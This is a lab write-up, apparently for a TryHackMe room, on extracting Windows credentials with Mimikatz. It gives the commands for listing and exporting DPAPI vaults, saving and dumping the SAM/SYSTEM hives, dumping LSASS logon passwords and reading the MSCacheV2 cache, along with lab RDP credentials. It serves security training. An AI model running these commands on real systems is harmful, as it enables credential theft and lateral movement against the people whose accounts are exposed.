# 🥷 Credential Extraction with Mimikatz

> **Topic:** Credential Harvesting
>
> **Focus:** Using Mimikatz in the supplied lab to inspect credential material from DPAPI Vaults, SAM/SYSTEM, LSASS and LSA cache.

---

# 📖 Overview

Mimikatz is a post-exploitation tool capable of interacting with several Windows credential stores.

The supplied material covers:

```text
LSASS Memory
SAM + SYSTEM
LSA Secrets / Cached Credentials
DPAPI Secrets
```

The lab scenario begins with local Administrator access to a domain-joined workstation (`WRK`) and demonstrates how credential material can be collected and potentially reused.

---

# 🖥️ Lab Connection

The supplied lab provides:

```text
Username: Administrator
Password: N3w34829DJdd?1
IP: 10.220.10.20
Connection: RDP
```

The lab uses an RDP session to the workstation.

> **Lab-only credentials:** The credentials and IP address above belong to the supplied training environment.

---

# 1️⃣ DPAPI Vault

Windows uses DPAPI to protect stored credentials such as:

- RDP connections
- Web passwords
- Wi-Fi keys

Mimikatz can enumerate and extract accessible Vault information in the appropriate user context.

---

## 📋 List Vaults

```text
mimikatz # vault::list
```

The supplied lab shows two Vaults:

```text
Web Credentials
Windows Credentials
```

The Windows Credentials Vault contains an entry associated with:

```text
TRYHACKME\svc-app
```

---

# 📤 Export Vault Credentials

```text
mimikatz # vault::cred /export
```

The supplied lab demonstrates results containing:

```text
TargetName : WRK / <NULL>
UserName   : TRYHACKME\svc-app
Type       : 2 - domain_password
```

It also shows a web credential entry:

```text
TargetName : gmail.com / <NULL>
UserName   : ElonTusk
Type       : 1 - generic
```

The supplied material masks the actual credential values.

---

# 🔐 Important DPAPI Observation

A local Administrator may be able to access user profile files, including DPAPI master keys and Vault data.

However, DPAPI secrets are tied to the relevant user's cryptographic context.

Therefore:

```text
Local Administrator
        ≠
Automatic decryption of every user's DPAPI secrets
```

The supplied material specifically notes that service-account secrets such as those belonging to `svc-app` remain protected unless the tester has the appropriate user context, password or token.

---

# 2️⃣ SAM + SYSTEM Hives

The SAM database contains local user password hashes.

The SYSTEM hive contains key material needed to decrypt the SAM database.

---

# 💾 Save the Hives

Open PowerShell as Administrator:

```cmd
reg save HKLM\SAM C:\Users\Administrator\Desktop\SAM
```

```cmd
reg save HKLM\SYSTEM C:\Users\Administrator\Desktop\SYSTEM
```

Expected result:

```text
The operation completed successfully.
```

---

# 🔓 Extract SAM Hashes

Run:

```text
mimikatz # lsadump::sam /sam:"C:\Users\Administrator\Desktop\SAM" /system:"C:\Users\Administrator\Desktop\SYSTEM"
```

The supplied lab shows:

```text
Domain : WRK
Local SID : S-1-5-21-1299963100-3047866590-1771456640
```

and a local Administrator NTLM hash.

---

# 🧠 Why Both Hives Are Needed

```text
SAM
 ↓
Encrypted local account hashes

SYSTEM
 ↓
BootKey / required key material

SAM + SYSTEM
 ↓
Mimikatz
 ↓
Local NTLM hashes
```

Recovered NTLM hashes can potentially be:

- Cracked offline.
- Reused in authorised pass-the-hash scenarios.

---

# 3️⃣ LSASS Memory

LSASS contains live credential material for active logon sessions.

---

# 🔑 Enable Debug Privilege

Run:

```text
mimikatz # privilege::debug
```

Expected:

```text
Privilege '20' OK
```

---

# 🧠 Dump Logon Credentials

```text
mimikatz # sekurlsa::logonpasswords
```

The supplied lab output shows information such as:

```text
Username
Domain
NTLM
SHA1
Kerberos information
Credential Manager entries
```

It also demonstrates that credentials can sometimes appear as plaintext depending on the authentication package and Windows configuration.

---

# ⚠️ Important Observation

The lab did **not** expose domain-user credentials from previously logged-on users simply because those users had logged in before.

The supplied material explains that LSASS retains relevant credentials dynamically and that inactive historical sessions may no longer be present.

---

# 4️⃣ LSA Cache

To access cached domain credentials, the supplied material elevates the token to SYSTEM.

---

## 👑 Elevate to SYSTEM

```text
mimikatz # privilege::debug
```

Then:

```text
mimikatz # token::elevate
```

Expected:

```text
SID name  : NT AUTHORITY\SYSTEM
```

---

## 🔎 Dump Cached Credentials

```text
mimikatz # lsadump::cache
```

The supplied lab demonstrates entries such as:

```text
User : TRYHACKME\Administrator
User : TRYHACKME\raoulduke
```

with:

```text
MsCacheV2
```

credential material.

---

# 🧠 What `lsadump::cache` Does

The supplied material describes it as reading the on-disk LSA cache, also known as:

```text
MSCacheV2
```

These are cached domain-user logon secrets used for offline authentication.

---

# 🔄 Mimikatz Credential-Harvesting Flow

```text
Local Administrator
        ↓
Mimikatz
        ↓
┌──────────────────────────┐
│ DPAPI Vault              │
│ SAM + SYSTEM             │
│ LSASS Memory             │
│ LSA Cache                │
└──────────────────────────┘
        ↓
Credential Material
        ↓
Cracking / Credential Reuse
        ↓
Potential Lateral Movement
```

---

# 💡 Key Takeaways

- Mimikatz can interact with multiple Windows credential stores.
- `vault::list` enumerates accessible credential vaults.
- `vault::cred /export` exports accessible Vault credentials.
- SAM + SYSTEM can reveal local account NTLM hashes.
- `privilege::debug` enables required debugging privileges for LSASS access.
- `sekurlsa::logonpasswords` reads live LSASS credential structures.
- `token::elevate` can obtain a SYSTEM token when permitted.
- `lsadump::cache` accesses cached domain logon material.
- DPAPI secrets remain tied to their user's cryptographic context.
